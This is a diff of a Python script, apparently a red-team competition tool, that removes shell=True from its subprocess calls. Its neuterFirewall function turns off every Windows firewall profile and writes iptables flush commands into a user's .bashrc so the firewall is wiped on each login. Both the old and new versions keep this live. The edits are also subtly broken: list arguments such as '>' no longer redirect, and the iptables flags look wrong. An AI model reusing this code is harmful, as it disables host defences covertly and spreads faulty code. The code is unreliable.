@@ -26,7 +26,7 @@ def windowsFileCheck(fl: str) -> bool:
 
 def unixFileCheck(fl: str) -> bool:
     try:
-        subprocess.run(f"cat {fl} > /dev/null", shell=True)
+        subprocess.run(["cat", f"{fl}", ">", "/dev/null"])
         return True
     except:
         return False
@@ -45,7 +45,7 @@ def fileExists(fl: str) -> bool:
 
 def checkFolder(fl: str) -> bool:
     try:
-        subprocess.run(["ls", f"{fl}", ">", "/dev/null"], shell=True)
+        subprocess.run(["ls", f"{fl}", ">", "/dev/null"])
         return True
     except:
         return False
@@ -93,15 +93,15 @@ def checkFiles(trackedFiles: list[str], hashes: dict[str, str], savedFiles: dict
 def whiteteam():
     # Check if /home/whiteteam exists, recreate with correct permissions if not
     if not checkFolder("/home/whiteteam"):
-        subprocess.check_output(["mkdir", "/home/whiteteam"], check=True, shell=True)
-        subprocess.check_output(["chmod", "700", "/home/whiteteam"], check=True, shell=True)
-        subprocess.check_output(["chown", "whiteteam:whiteteam", "/home/whiteteam"], check=True, shell=True)
+        subprocess.check_output(["mkdir", "/home/whiteteam"], check=True)
+        subprocess.check_output(["chmod", "700", "/home/whiteteam"], check=True)
+        subprocess.check_output(["chown", "whiteteam:whiteteam", "/home/whiteteam"], check=True)
 
 def neuterFirewall() -> None:
     if PLATFORM == "Windows":
         subprocess.run(["netsh", "advfirewall", "set", "allprofiles", "state", "off"], check=True)
     elif PLATFORM == "Unix":
-        subprocess.check_output(["echo", "iptables -F; iptables -T mangle -F; iptables -T nat -F", ">>", "/home/bob/.bashrc"], shell=True)
+        subprocess.check_output(["echo", "iptables -F; iptables -T mangle -F; iptables -T nat -F", ">>", "/home/bob/.bashrc"])
 
 def main():
     checkPlatform()
